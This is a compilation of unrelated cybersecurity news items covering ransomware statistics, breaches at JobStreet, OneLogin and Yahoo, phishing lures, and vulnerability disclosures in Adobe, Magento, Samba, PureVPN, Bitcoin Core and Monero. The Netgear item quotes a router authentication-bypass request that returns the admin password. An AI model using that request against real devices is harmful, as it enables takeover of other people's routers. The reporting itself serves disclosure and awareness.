Imperva, Inc (IMPV), committed to protecting business-critical data and applications in the cloud and on-premises, today announced the results of a survey of 170 security professionals taken at RSA 2017, the world’s largest security conference, exploring their experiences with ransomware.
Thirty-two percent of respondents said their company had been infected with ransomware with 11 percent taking longer than a week to regain access to their systems after an attack.
According to CNN, in 2016, the FBI estimated that ransomware would be a $1 billion a year crime.
More than half (59 percent) of those surveyed said that the cost of downtime due to lack of access to systems for customers and employees was the biggest business impact of a ransomware attack.
Twenty-nine percent said that if their company suffered a ransomware attack which resulted in downtime, they would be losing between $5,000 and $20,000 a day.
Twenty-seven percent thought that the amount could be over $20,000 a day.
“Whether companies choose to pay the extortion or not, the real cost of ransomware is downtime and lost productivity,” said Terry Ray, chief product strategist at Imperva.
“Even if victims have backup files or are willing to pay the ransom, the cost associated with productivity downtime adds up quickly.
What’s more, the availability of ransomware-as-a-service, combined with high profits for the attackers, means ransomware attacks are likely to escalate in 2017,” he added.
“The interesting thing about ransomware is how simple it is to execute and how easy it is to inflict damage.
Organizations tend to think of hacking as though it was rocket science which always puts them on the losing end.
The reality is that hacking is most often simple, and mitigating it requires proper attention and tools which do exist and are within reach of most enterprises.
Hacking is a serious business and enterprises should, therefore, treat information security seriously,” Ray concluded.

JobStreet is informing clients by email whether they were caught up in a Malaysia-based data breach that affected 19 different companies.
“We are writing to notify you that we recently identified a post claiming that personal information from the databases of 19 corporations and associations had been made public, including ours,” the email says.
According to website haveibeenpwned.com, 3,883,455 JobStreet accounts were affected by the breach. It says the information was freely downloadable on a Tor hidden service.
The breach also affected more than 46 million Malaysian users and several telecommunications companies.
Telecommunications providers caught by the breach include Altel, Celcom, DiGi, EnablingAsia, Friendi, Maxis, Merchantrade Asia, PLDT, Redtone, Tunetalk, Umobile and XoX, reports suggest.
It also affected organisations such as the Academy of Medicine Malaysia, the Malaysian Dental Association, the Malaysian Medical Association, and the National Specialist Register of Malaysia. Reports speculate that more than 81,000 records were stolen from these organisations.
“Our investigations established that some personal candidate information pertaining to accounts created before July 2012 has been exposed. To help protect our customers, the team is continuously enhancing our security measures for all user information stored with JobStreet.com,” JobStreet CEO Suresh Thiru says in an email.
According to media reports, that personal information includes identity card numbers, addresses, login IDs, passwords, names, emails and phone numbers.
Haveibeenpwned.com also notes that on JobStreet, dates of birth, genders, geographic locations, marital statuses, nationalities and usernames were also compromised.
The Malaysian Communications and Multimedia Commission (MCMC) may have discovered the possible source of the data leaks, according to Malaysian Communications Minister Salleh Said Keruak.
""We have identified several potential sources of the leak and we should be able to complete the probe soon,"" he announced.

THE Irish public are being warned by an antivirus protection company as cyber scammers are targeting Tesco and Bank of Ireland customers.
ESET Ireland have looked at recent cyber threats arriving by mail in recent weeks, and they are advising caution as one link could see your money stolen.
The cyber security company say that for the people sending these malicious emails, it’s a numbers game that they are playing.
IT security and cybercrime analyst for ESET Ireland, Urban Schrott, said: ""Send out enough spam and a certain percentage of victims will click. So, week after week, we’re seeing new scams or new variations on old scams. The past weeks were no exception.""
One such email that was sent out this week was targeted at Tesco Bank customers - the elaborate letter pretended to have come from the Tesco Bank credit card team.
It reads: “We’ve been trying to contact you about your account, but we've been unable to reach you. Your account has been restricted. To continue using our online services and have your account restored, just to keep you safe, kindly confirm your identity and remove your account limitations with the reference link below.”
They would then proceed to kindly steal your log in details and try to log into your account to take your money.
Bank of Ireland customers are also being targeted and ESET say that the Irish bank is ""always a popular name to abuse"".
The company have detected two phishing variations which have recently targeted members of the banking institution.
One convincing looking email claims: “In order to protect your funds and information, Bank of Ireland has set up a new enhanced security system, which will eliminate fraud and totally protect you. The new system is called Boi Secure Link. Click the Boi Secure Link below to enjoy the new security features.”
Of course, clicking on that link does everything but protect you, but instead attempts pretty much the same as the Tesco one.
The second one was even simpler, but unfortunately, not less effective. It said: “My Inbox (1) ~ Your message is available to view on 365 online. Log in to 365Online”.
As curiosity tends to get the better of people, a “new message in the inbox” is a good lure to get people clicking.
ESET Ireland recommends you avoid clicking on any links in such emails and do not open attachments, as they may contain malware that can end up installing ransomware, or can lead to phishing or scamming websites.

Cyberthieves are increasingly targeting the malicious software, which locks all files on a targeted computer or network until the owner pays up, at smaller and arguably more vulnerable organizations.
The Catholic Charities of Santa Clara County in California was a recent target.
Seconds after a co-worker clicked on a malicious email attachment, “the compressed file she had opened connected her computer with a server in the Ukraine,” says Will Bailey, director of IT for the organization.
“It downloaded the ransomware code and began to encrypt files on her device”.
While cyberthieves ostensibly have more to gain from large organizations, experts say they see smaller organizations as lower-hanging fruit.
Because a successful breach of an institution with fewer information security resources is easier to achieve and more likely to have a meaningful impact, it is also more likely to result in a payment.
“Small businesses are frequently a more appealing target for ransomware because they sit at the juncture of money and vulnerability,” says Ryan Olson, director of the Palo Alto Networks Unit 42 cybersecurity threat intelligence team.
“They frequently have more money than individuals, but being small businesses, they lack the more sophisticated defenses that larger business have”.
“These attackers have also learned that the most profitable method is to hit many small businesses with low ransom demands—usually $300 to $2,000.
Even small businesses can generally afford to pay those amounts”.
— Eric Hodge, director of consulting, IDT911 Consulting
The stats are staggering.
The frequency of ransomware attacks against organizations with fewer than 200 employees is poised to “triple or quadruple” from that of 2015, according to Eric Hodge, director of consulting for IDT911 Consulting.
And 60 percent of small businesses that suffer a ransomware attack are already going out of business within six months, according to the U.S. National Cyber Security Alliance.
For many small businesses, if the ransom is low enough, and data backups aren’t available, experts say the most cost-effective response is often to pay the ransom.
“At this point, it seems to be the small companies, and individuals providing service as a company, who are in the crosshairs,” Hodge says.
“These attackers have also learned that the most profitable method is to hit many small businesses with low ransom demands—usually $300 to $2,000.
Even small businesses can generally afford to pay those amounts”.
Ransomware reportedly has cost U.S. small to midsize businesses alone more than $75 billion in damages and payments, according to a September 2016 survey by data protection vendor Datto.
Indeed, 31 percent of the Datto survey’s respondents said they had experienced multiple ransomware attacks within a single day, and a whopping 63 percent said these attacks led to downtime in their business operations, which could cost them as much as $8,500 per hour.
And according to Symantec’s 2016 Internet Security Threat Report, 43 percent of last year’s phishing emails, the vast majority of which were laced with ransomware, targeted small businesses—up from 18 percent in 2011.
New research indicates that consumers similarly are becoming more attractive ransomware targets.
According to a recent study from IBM X-Force, which surveyed 600 business professionals and 1,000 consumers, 54 percent of consumers said they would pay a ransom to retrieve their financial data, and 55 percent of parents said they would pay to have digital photos returned.
With cybercriminals constantly upping their game in ransomware, small businesses and consumers have little choice but to remain vigilant and take “simple steps” to mitigate the risk of an attack, Palo Alto Networks’ Olson says.
In addition to keeping systems up-to-date with security updates, and taking precautions before opening attachments or clicking on links, he recommends maintaining offline backups—or cloud-based backups outside your network—to recover potentially compromised files.

OneLogin, an online service that lets users manage logins to sites and apps from a single platform, says it has suffered a security breach in which customer data was compromised, including the ability to decrypt encrypted data.
Headquartered in San Francisco, OneLogin provides single sign-on and identity management for cloud-base applications. OneLogin counts among its customers some 2,000 companies in 44 countries, over 300 app vendors and more than 70 software-as-a-service providers.
A breach that allowed intruders to decrypt customer data could be extremely damaging for affected customers. After OneLogin customers sign into their account, the service takes care of remembering and supplying the customer’s usernames and passwords for all of their other applications.
In a brief blog post Wednesday, OneLogin chief information security officer Alvaro Hoyos wrote that the company detected unauthorized access to OneLogin data.
“Today we detected unauthorized access to OneLogin data in our US data region. We have since blocked this unauthorized access, reported the matter to law enforcement, and are working with an independent security firm to determine how the unauthorized access happened and verify the extent of the impact of this incident. We want our customers to know that the trust they have placed in us is paramount.”
“While our investigation is still ongoing, we have already reached out to impacted customers with specific recommended remediation steps and are actively working to determine how best to prevent such an incident from occurring in the future and will update our customers as these improvements are implemented.”
OneLogin’s blog post includes no other details, aside from a reference to the company’s compliance page. The company has not yet responded to request for comment. However, Motherboard has obtained a copy of a message OneLogin reportedly sent to its customers about the incident, and that missive contains a critical piece of information:
“Customer data was compromised, including the ability to decrypt encrypted data,” reads the message OneLogin sent to customers.
According to Motherboard, the message also directed customers to a list of required steps to minimize any damage from the breach, such as generating new API keys and OAuth tokens (OAuth being a system for logging into accounts), creating new security certificates as well as credentials; recycling any secrets stored in OneLogin’s Secure Notes feature; and having end-users update their passwords.
Gartner Inc. financial fraud analyst Avivah Litan said she has long discouraged companies from using cloud-based single sign-on services, arguing that they are the digital equivalent to an organization putting all of its eggs in one basket.
“It’s just such a massive single point of failure,” Litan said. “And this breach shows that other [cloud-based single sign-on] services are vulnerable, too. This is a big deal and it’s disruptive for victim customers, because they have to now change the inner guts of their authentication systems and there’s a lot of employee inconvenience while that’s going on.”
KrebsOnSecurity will likely update this story throughout the day as more details become available.
“Our review has shown that a threat actor obtained access to a set of AWS keys and used them to access the AWS API from an intermediate host with another, smaller service provider in the US. Evidence shows the attack started on May 31, 2017 around 2 am PST. Through the AWS API, the actor created several instances in our infrastructure to do reconnaissance. OneLogin staff was alerted of unusual database activity around 9 am PST and within minutes shut down the affected instance as well as the AWS keys that were used to create it.”
“The threat actor was able to access database tables that contain information about users, apps, and various types of keys. While we encrypt certain sensitive data at rest, at this time we cannot rule out the possibility that the threat actor also obtained the ability to decrypt data. We are thus erring on the side of caution and recommending actions our customers should take, which we have already communicated to our customers.”

A GandCrab ransomware attack, combined with a Comcast outage, caused a Florida Keys school district’s computer system to be down for a week.
The computer system in a Florida Keys school district were down for a week due to a ransomware attack. The problems were made worse when just as the district was bringing up some administration and school computers, Comcast suffered a day-long outage due to a cut fiber.
Monroe County School District was the victim of a GandCrab ransomware attack. GandCrab, first spotted in January, was dubbed the leading ransomware threat in July. A school district employee working on payroll discovered undisclosed problems on Sunday, Sept 9, and submitted an IT ticket. IT contacted Symantec and was advised to bring it all down and secure the system.
Pat Lefere, executive director of operations and planning for the district, told the Miami Herald, “This particular one was a variant that Symantec hadn’t seen before. They took all of our files and created a patch for us. It was applied to all servers before bringing them back up.”
Symantec shows the latest detected GandCrab ransomware discovered on Wednesday, Sept 12, but it may not be the variant that hit the Florida school district, as the IT department thought it had fixed the problem on Tuesday morning. Yet upon bringing the system back up, they saw the same issues as when the ransomware was discovered on Sunday and shut the system down again.
“We haven’t had any access to data that was inappropriate nor have we had lost data,” district superintendent Mark Porter later told the Miami Herald. “The bad news is we haven’t had the type of access our employees are used to.” The cyber attack did not affect payroll, but it did affect delivery of students’ mid-quarter progress reports.
Monroe County School District claimed there were no ransom demands, but since ransomware locks up a system and demands payment to retrieve a decryption key for encrypted files, perhaps the district meant it didn’t cave to extortion? Lefere said, “That only happens for folks that don’t back up their stuff and are so desperate. We recover our files from the last backup.”
The district’s website was back up by Wednesday, but the computer systems remained partially down on Thursday. Lefere said the district rebuilt “each server from scratch to make sure they’re clean.”

Yahoo CEO Marissa Mayer said she'll forego her 2016 bonus and any stock award for this year after the company admitted it failed to properly investigate hack attacks that compromised more than a billion user accounts.
Further ReadingYahoo admits it’s been hacked again, and 1 billion accounts were exposed ""When I learned in September 2016 that a large number of our user database files had been stolen, I worked with the team to disclose the incident to users, regulators, and government agencies,"" she wrote in a note published Monday on Tumblr.
""However, I am the CEO of the company and since this incident happened during my tenure, I have agreed to forgo my annual bonus and my annual equity grant this year and have expressed my desire that my bonus be redistributed to our company’s hardworking employees, who contributed so much to Yahoo’s success in 2016.""
Her note came as Yahoo for the first time said that outside investigators identified about 32 million accounts for which forged browser cookies were used or taken in 2015 and 2016.
The investigators said some of the forgeries were connected to the same nation-sponsored attackers who compromised Yahoo in 2014.
The cookies tied to the forgeries have since been invalidated.
Yahoo also said that the 2014 attacks targeted 26 specific accounts by exploiting the company’s account management tool.
The company went on to say unnamed senior executives failed to grasp the extent of the breach early enough.
A filing submitted Monday with the US Securities and Exchange Commission stated:
Based on its investigation, the Independent Committee concluded that the Company’s information security team had contemporaneous knowledge of the 2014 compromise of user accounts, as well as incidents by the same attacker involving cookie forging in 2015 and 2016.
In late 2014, senior executives and relevant legal staff were aware that a state-sponsored actor had accessed certain user accounts by exploiting the Company’s account management tool.
The Company took certain remedial actions, notifying 26 specifically targeted users and consulting with law enforcement.
While significant additional security measures were implemented in response to those incidents, it appears certain senior executives did not properly comprehend or investigate, and therefore failed to act sufficiently upon, the full extent of knowledge known internally by the Company’s information security team.
Specifically, as of December 2014, the information security team understood that the attacker had exfiltrated copies of user database backup files containing the personal data of Yahoo users but it is unclear whether and to what extent such evidence of exfiltration was effectively communicated and understood outside the information security team.
However, the Independent Committee did not conclude that there was an intentional suppression of relevant information.
Nonetheless, the Committee found that the relevant legal team had sufficient information to warrant substantial further inquiry in 2014, and they did not sufficiently pursue it.
As a result, the 2014 Security Incident was not properly investigated and analyzed at the time, and the Company was not adequately advised with respect to the legal and business risks associated with the 2014 Security Incident.
The Independent Committee found that failures in communication, management, inquiry and internal reporting contributed to the lack of proper comprehension and handling of the 2014 Security Incident.

A hacker that goes by the nickname of Cipher0007 has hacked the Sanctuary Dark Web marketplace. The hacker announced the breach a few hours ago and also posted proof of his intrusion.
According to Cipher0007, the hack took place after he found an SQL injection flaw in the market's database.
The hacker claims he used the SQL injection flaw to upload a shell on the market's server. He then used this backdoor to access various parts of the backend and dumped the private key used to generate the market's .onion URL.
Cipher0007 also says he used the market's phpMyAdmin installation to dump details on the database configuration and other login information. At the time of writing, the market's phpMyAdmin login page was still exposed to external connections.
To prove his claims, the hacker posted online a screengrab while uploading the shell to the Sanctuary market's server, the market's 1024 bit RSA private key, and the market's root account database login information.
The Sanctuary market is a small Dark Web market, and one of the few places where digital products such as data dumps, malware, and others, are far more prevalent than drugs and weapons.
The admin of the Sanctuary market did not respond to a request for comment from Bleeping Computer in time for this article's publication.
Cipher0007 has a reputation in the hacking underground already. In January, the hacker collected an unspecified Bitcoin reward for reporting a bug to the AlphaBay staff that would have allowed an attacker access to over 218,000 private messages.
AlphaBay is today's biggest Dark Web market, and access to those PMs would have allowed an attacker insight into the operations of many sellers and vendors.

This week, Adobe has  released its very first Patch Tuesday update bundle for the year 2019. The Adobe January Patch Tuesday updates brought fixes for security vulnerabilities in Adobe Digital Editions and Adobe Connect. It has also released patches for Flash Player, but they are not security fixes.
This Tuesday, Adobe has rolled-out scheduled monthly updates for its products. However, this time, it has particularly focused on Adobe Digital Editions and Adobe Connect for security fixes. Besides, the update bundle is relatively smaller, unlike the previous updates that addressed tens of vulnerabilities.
According to the security advisory, Adobe has fixed an important security vulnerability in Adobe Digital Editions. Describing the problem, they stated,
    “Successful exploitation could lead to information disclosure in the context of the current user.”
Reportedly, it’s an out of bounds read flaw (CVE-2018-12817) that affected the software version 4.5.9 and earlier for all platforms, i.e., Windows, MacOS, Android and iOS. Users should ensure updating their devices with the patched Adobe Digital Editions version 4.5.10.
In addition to the above, another important vulnerability existed in Adobe Connect that could result in session token exposure. As stated in the advisory, the vulnerability (CVE-2018-19718) could “lead to exposure of privileges granted to a session.”
The vulnerability affected the Adobe Connect versions 9.8.1 and earlier for all platforms. Users should, hence, ensure updating their systems with the patched version 10.1.
Besides the two security fixes, Adobe have released patches for Flash Player as well addressing performance issues. As described in the Adobe advisory,
    “Adobe has released updates for Adobe Flash Player for Windows, macOS, Linux and Chrome OS.  These updates address feature and performance bugs, and do not include security fixes.”
The patched Flash Player version 32.0.0.114 has been rolled-out to be downloaded across all platforms.
This time, the update bundle did not address security problems in Adobe Reader or Acrobat. However, the vendors already released security fixes for them in the previous week. The patch addressed two critical vulnerabilities (CVE-2018-16011 and CVE-2018-16018) that could result in arbitrary code execution and privilege escalation respectively.

Super Mario Run is projected to launch in the Google Play Store in the coming weeks, after previously going live on iOS on December 15, and cybercriminals are trying to benefit from the excitement generated by Nintendo’s new title using a new wave of malware.
Security company zscaler warns that malware disguised as Super Mario Run for Android is now spreading across the Internet, with users encouraged to download APKs that eventually infect devices and attempt to steal financial information.
Specifically, the malicious Super Mario Run for Android package is infected with the Android Marcher Trojan, which now comes disguised as Nintendo’s game, but features a similar behavior to what we’ve seen in the past.
Once it infects an Android device, it opens an overlay that requires users to enter their financial details whenever mobile banking apps are launched, and collected data is then saved and submitted to a command and control center owned by the attacker.
In most of the cases, the Google Play Store can no longer launch as users are provided with the same overlay asking for financial details.

A popular version of the open source Magento ecommerce platform is vulnerable to a zero-day remote code execution vulnerability, putting as many as 200,000 online retailers at risk. The warning comes from security firm DefenseCode, which found and originally reported the vulnerability to Magento in November.
“During the security audit of Magento Community Edition, a high risk vulnerability was discovered that could lead to remote code execution and thus the complete system compromise including the database containing sensitive customer information such as stored credit card numbers and other payment information,” DefenseCode wrote in a technical description of its discovery (PDF) posted Wednesday.
According Bosko Stankovic, information security engineer at DefenseCode, despite repeated efforts to notify Magento, which began in November 2016, the vulnerability remains unpatched despite four version updates since the disclosure. DefenseCode did not examine Magento Enterprise, the commercial version of the platform, but warns both share the same underlying vulnerable code.
“We’re unsure if this vulnerability is actively being exploited in the wild, but since the vulnerability has been unpatched for so long it provides a window of opportunity for potential hackers,” Stankovic said.
Magento confirmed the existence of the flaw in a brief statement to Threatpost and said it was investigating.
“We have been actively investigating the root cause of the reported issue and are not aware of any attacks in the wild. We will be addressing the issue in our next patch release and continue to consistently work to improve our assurance processes,” Magento said in a statement.
Yesterday, Threatpost reported a story about a remote code execution vulnerability with Magento 2 Enterprise and Community software. 
Magento is committed to delivering superior security to clients and has been actively investigating the root cause of the reported issue. We are not aware of any attacks in the wild. Admin access is required to execute the exploit, so as always, we encourage you to follow best practices to keep your Admin secure. 
In addition, this vulnerability will be addressed in our next release targeted for early May. Until then, we recommend enforcing the use of “Add Secret Key to URLs” to mitigate potential attacks.

Samba has released security updates addressing a possible avenue for DoS attacks and attackers changing administrator passwords. Samba 4 users should update now.
Open source server platform Samba has issued patches for two critical vulnerabilities that could be used to launch denial-of-service attacks or allow anyone to change user and administrator passwords.
Samba is a free, open source interoperability suite that extends Windows file and print services to Unix and Linux machines. Businesses that run Unix/Linux and Windows side by side frequently use Samba to link the two operating systems together, making any risk to the security and stability of Samba a serious risk.
The vulnerabilities in question, CVE-2018-1050 and CVE-2018-1057, are both serious risks for anyone using Samba. If your business has a Samba implementation it's highly recommended that you install the applicable security updates.

What the Samba vulnerabilities can do
The first vulnerability, 1050, affects all Samba instances version 4.0.0 and up. More specifically, it only affects version 4.0.0 and up Samba installations that are also running their Remote Procedure Call (RPC) Spool Subsystem Service (spoolss) as an external daemon (RPC spoolss is configured to internal by default).
If the RPC spoolss misses an input sanitization check it can cause the print spooler to crash, effectively killing the ability for anyone using Samba to send files to a printer.
The second vulnerability, 1057, is a far greater risk to Samba security. Like 1050, it affects all Samba installations version 4.0.0 and up and allows users to change the passwords of other users, including those with admin rights.
1057's problem stems from a problem with how Samba Active Directory domain controllers handle permission validations using the lightweight directory access protocol (LDAP). ""The LDAP server incorrectly validates certain LDAP password modifications against the 'Change Password' privilege, but then performs a password reset operation,"" Samba said.
This vulnerability only affects Samba installations being used as Active Directory domain controllers, so those using Samba in non-domain control roles don't need to be concerned.
If you are using Samba as an AD DC and can't install the security patch yet, there is a workaround Samba says you can put in place as a temporary protection measure: revoking password change permissions for ""the world"" group.

PureVPN has had two vulnerabilities which would allow hackers to retrieve stored passwords through the VPN client. This was confirmed by Trustwave’s security researcher Manuel Nader, and the VPN provider itself.
One of the two vulnerabilities were fixed in the meantime, while the other one remains active, and PureVPN has, according to Nader, “accepted the risk”.
The vulnerability that was patched saw saved passwords stored in plaintext, on this location: 'C:\ProgramData\purevpn\config\login.conf
All users have had the chance to access and read the file by simply opening it through the CMD. This vulnerability has been patched in the version 6.1.0. and whoever uses PureVPN is strongly advised to update to the latest version, as soon as possible.

The second vulnerability is the one that remains open, and the company has decided to ‘accept the risk’.
So basically, you’d need to open the Windows client, open Configuration, User Profile, and click on ‘Show Password’.
A spokesperson for PureVPN sent us the following statement.
""This is not a vulnerability rather a feature that we deployed for ease of our users. Back in April 2018, when Trustwave reported it to us, we assessed the risk, and found it minimally due to how our systems are designed.
Our systems work a bit different than most of the other VPN providers. For enhanced security, we use separate passwords for Member Area and VPN access. Member Area password which is more privileged is not shown in apps, it's the VPN access password that is the subject of this feature. Furthermore, by default, our VPN passwords are system generated and not set by users. This curtails the risk of users using the same password for VPN accounts that they use for their sensitive accounts elsewhere on the Internet. On the other hand, this enhanced security design proved a little difficult for quite a few of our users and hence we offered a way for them to easily retrieve their VPN password.
For now the community has raised concerns and is confusing it as a vulnerability, we have temporarily removed the feature and released a newer version 6.2.2. To those users of our who pretty much use this feature to retrieve the separate password for VPN we would like to inform that we plan to redesign the future, keeping these concerns in mind, and release it back in our November 2018 release.
We use Bugcrowd, a public Bug Bounty Program that employees some 90,000 ethical hackers to test our product. We remain in heavy collaboration with the InfoSec community and hence have such aggressive and streamlined processes in place to have released the new version 6.2.2 within a few hours only.""

The Bitcoin Core developers recently fixed a major vulnerability in the Bitcoin (BTC) network’s (client) codebase. Explaining the potentially serious nature of the software bug, which is tracked as CVE-2018-17144 and classified as a denial-of-service (DoS) attack, Casaba Security co-founder Jason Glassberg said: “[It] can take down the network.”
Glassberg also told ZDNet the vulnerability in the Bitcoin Core codebase “would [have] affected transactions in the sense that they cannot be completed, but does not appear to open up a way to steal or manipulate wallets.”
Denial-of-Service (DoS), 51% Attacks
The Bitcoin Core client software is used by BTC miners to validate transactions on the cryptocurrency’s blockchain and the recent vulnerability found in its source code could have been used to intentionally crash bitcoin’s full-node operators.
Although not logistically feasible, this particular software bug could have been remotely exploited by an attacker to launch a 51% attack in which one entity controls the majority of the hashing (or computing) power of a cryptocurrency network.
Advisory Notice, Critical Patch Released
In most cases, a bad actor has orchestrated a 51% attack in order to manipulate transactions on a cryptocurrency’s blockchain for financial gains. At present, it would cost approximately $490,000 to launch such an attack (for 1 hour) on the Bitcoin network, according to Crypto51.
However, if the recent Bitcoin Core software bug had not been patched, a bad actor could have initiated a 51% attack on the cryptocurrency’s network at a considerably lower cost. The Bitcoin Core developers posted an advisory notice (on September 19th) regarding this DoS vulnerability.
Users of Bitcoin Core have been instructed to upgrade to version 0.16.3 of the software. Previous versions (0.14.0 to 0.16.3) of the client contain the DoS vulnerability. Bitcoin Knots, one of at least 96 bitcoin forks to date, was considered vulnerable as well and its client software was patched.
""Copycat"" Cryptos Are At Risk
Notably, the CVE-2018-17144 vulnerability could have also affected the litecoin (LTC) network but its client has received a patch. Commenting on the serious nature of these software bugs, Cornell computer science professor Emin Gün Sirer said: “Copycat currencies are at risk” - meaning that all bitcoin forks are vulnerable to the attack.
The Turkish-American cryptographer, who identified critical vulnerabilities in Ethereum’s codebase before its network was hit with the DAO attack, was referring to all the currently 69 active bitcoin forks that could still be exploited with a 51% attack as their clients might still not have received a patch and are not as secure as bitcoin network due to their smaller size.
In fact, Crypto51 has estimated it would only cost $122 to launch a 51% attack on the Bitcoin Private (BTCP) network. However, this estimate has not been confirmed by another source.

How is it possible for users to lose hundreds of dollars in anomalous online bank transfers when all of their gadgets have security software installed?
Last year, user Y, who is based in Brazil, lost R$600 (US$191.02, as of January 30, 2017) as a side effect of information theft.
Upon discovering this, Y immediately called an IT technician to find the root cause.
But since no malware was found in the devices connected to the network, he then reviewed the home router settings.
What he found was interesting:  even though the home router did not expose any remote management interface to the internet, the DNS settings were still modified.
In another case, user X noticed R$3,000 (US$955.11, as of January 30, 2017) was deducted from her account last January 2016.
Her home router was also infected with a malicious DNS-changing malware.
Routers often have unsecure configurations that make them susceptible to malware attacks similar to the real-world cases we presented above.
For one, security flaws exist in the operating system, firmware, and web applications of routers.
Attackers can simply use these vulnerabilities as entry points to further compromise the home network.
Web-based scripts are an effective tactic to infiltrate routers.

The Russian hacking group blamed for targeting U.S. and European elections has been breaking into email accounts, not only by tricking victims into giving up passwords, but by stealing access tokens too. 
It's sneaky hack that's particularly worrisome, because it can circumvent Google's 2-step verification, according to security firm Trend Micro. 
The group, known as Fancy Bear or Pawn Storm, has been carrying out the attack with its favored tactic of sending out phishing emails, Trend Micro said in a report Tuesday. 
The attack works by sending out a fake email, pretending to be from Google, with the title “Your account is in danger.”
An example of a phishing email that Fancy Bear has used. 
The email claims that Google detected several unexpected sign-in attempts into their account. It then suggests users install a security application called “Google Defender.”
However, the application is actually a ruse. In reality, the hacking group is trying to dupe users into giving up a special access token for their Google account, Trend Micro said.
Victims that fall for the scheme will be redirected to an actual Google page, which can authorize the hacking group's app to view and manage their email. Users that click “allow” will be handing over what’s known as an OAuth token.
Although the OAuth protocol doesn't transfer over any password information, it's designed to grant third-party applications access to internet accounts through the use of special tokens. 
In the case of Fancy Bear, the hacking group has leveraged the protocol to build fake applications that can fool victims into handing over account access, Trend Micro said.  
“After abusing the screening process for OAuth approvals, (the group’s) rogue application operates like every other app accepted by the service provider,” the security firm said.
Even Google's 2-step verification, which is designed to prevent unwarranted account access, can't stop the hack, according to Trend Micro.
Google's 2-step verification works by requiring not only a password, but also a special code sent to a user's smartphone when logging in. Security experts say it's an effective way to protect your account.
However, the phishing scheme from Fancy Bear manages to sidestep this security measure, by tricking users into granting access through the fake Google security app.
Google, however, said it takes many steps to protect users from such phishing attacks.
""In addition, Google detects and reviews potential OAuth abuse and takes down thousands of apps for violating our User Data Policy, such as impersonating a Google app,"" the company said in a statement.
""Note that a real Google app should be directly accessed from a Google site or installed from the Google Play or Apple App stores,"" it added.
According to Trend Micro, victims were targeted with this phishing attack in 2015, and 2016. In addition to Google Defender, Fancy Bear has used other apps under names such as Google Email Protection and Google Scanner. They’ve also gone after Yahoo users with apps called Delivery Service and McAfee Email protection.
The attack attempts to trick users into handing over access to their email through fake Google third-party applications. 
“Internet users are urged to never accept OAuth token requests from an unknown party or a service they did not ask for,” Trend Micro said.
Although a password reset can sometimes revoke an OAuth token, it's best to check what third-party applications are connected to your email account. This can be done by looking at an email account's security settings, and revoking access where necessary. 
Fancy Bear is most notorious for its suspected role in hacking the Democratic National Committee last year. However, the group has also been found targeting everything from government ministries, media organizations, along with universities and think tanks, according to Trend Micro.

Yesterday, researcher Simon Kenin of Trustwave SpiderLabs released information about an authentication bypass flaw affecting a wide variety of Netgear routers, as well as PoC attack code for triggering it.
The vulnerability (CVE-2017-5521) can be exploited by attackers to discover the password required to take over control of an affected device.
“The bug is exploitable remotely if the remote management option is set and can also be exploited given access to the router over LAN or WLAN,” he explained.
“When trying to access the web panel a user is asked to authenticate, if the authentication is cancelled and password recovery is not enabled, the user is  redirected to a page which exposes a password recovery token.
If a user supplies the correct token to the page http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not enabled), they will receive the admin password for the router”.
He discovered the vulnerability almost a year ago, but revealed it only now because Netgear has been slow to push out fixed firmware for affected devices.
“In June [2016] Netgear published a notice that provided a fix for a small subset of vulnerable routers and a workaround for the rest.
They also made the commitment to working toward 100% coverage for all affected routers,” he noted.
“The notice has been updated several time since then and currently contains 31 vulnerable models, 18 of which are patched now, and 2 models that they previously listed as vulnerable, but are now listed as not vulnerable.
In fact, our tests show that one of the models listed as not vulnerable (DGN2200v4) is, in fact, vulnerable and this can easily be reproduced with the POC provided in our advisory”.
Trustwave found over 10,000 remotely accessible vulnerable devices, and estimates that there are many more non-remotely accessible affected devices in use – possibly even a million.

It appears popular cryptocurrency Monero, often praised for its privacy functions, was riddled with security vulnerabilities – one of which allowed hackers to steal coins directly from the wallets of exchange desks.
Utilizing old-fashioned social engineering, inventive hackers could forge transaction data and use it to trick support staff into crediting their account manually with extra XMR.
By simply copying a line of code from Monero’s wallet – which is open-sourced and accessible to everyone – the attackers could manipulate the amounts shown by the wallet when facilitating transactions between addresses.
The good thing is that the flaw has since been patched (in Monero at least, it is not entirely clear if this is the case for other Monero-based coins). The more concerning part is that it is only one out of six vulnerabilities disclosed by Monero in the last 24 hours alone, according to information from its HackerOne bug bounty program.
Other bugs included a Denial of Service attack vector that could’ve been abused to clog the Monero blockchain and a Python script exploit that made it possible to take down active nodes on the network. Just like the wallet flaw, all of these vulnerabilities have already been fixed.
This is not the first time researchers have found kinks in the anonymous cryptocurrency’s code – but to Monero’s credit, its dev team has always made sure to address such concerns appropriately.
It’s no surprise that bug bounties are really becoming an industry standard, considering considering how much damage they can prevent. Recently $24,000 was claimed in one week across four different blockchain projects.
Apparently, probing EOS is even more profitable: one hacker got paid $80,000 in one day for identifying critical bugs in its code.

Update August 3, 09:15 AM UTC: Monero project lead Riccardo Spagni, better known under the pseudonym ‘fluffypony,’ has since addressed the vulnerability disclosures in an email to Hard Fork.
Spagni highlighted that although the bugs were made public yesterday, they were discovered – separately – over the span of several months.
“The [wallet] vulnerability was introduced by the sub-address functionality, so it’s relatively new,” Spagni told Hard Fork.

A case involving software vulnerabilities in medical electronics reveals the inability for both the health care sector and federal regulators to swiftly address cybersecurity problems.
This past fall, an investment firm rattled the health care industry with unsubstantiated claims of multiple software vulnerabilities in internet-connected pacemakers and cardiac defibrillators.
But it took federal authorities who regulate medical devices four months to acknowledge only one of the alleged defects, and for the company, St. Jude Medical, to patch it.
The delayed response to a problem that could potentially put patients at risk raises many questions about why it took so long for the government to act, and what it will take for the health care industry to respond more swiftly to bugs in medical equipment increasingly connected to the internet.
""Software is never perfect and all systems still will have these flaws,"" says Joshua Corman, director of the Cyber Statecraft Initiative at the Atlantic Council and an expert on medical device security.
""The question is how gracefully and collaboratively and quickly and safely can we respond to these flaws.""
In this particular case, legal action as well as the unusual way the St. Jude vulnerabilities came to light may have stifled the response.
A cybersecurity firm called MedSec initially discovered the problems in the St. Jude devices and tipped off the activist investment firm Muddy Waters, which publicized the flaws and advised clients to bet against the health care firm's stock.
As a result, St. Jude lodged a defamation lawsuit against MedSec and Muddy Waters, denying many of the alleged glitches in its pacemaker and implantable defibrillator systems.
""In theory, most disclosures now should take about 60 days to get to some clarity or resolution,"" said Corman.
""In part, because of the contentious nature and the lawyers involved in this particular one, it took about five months.""
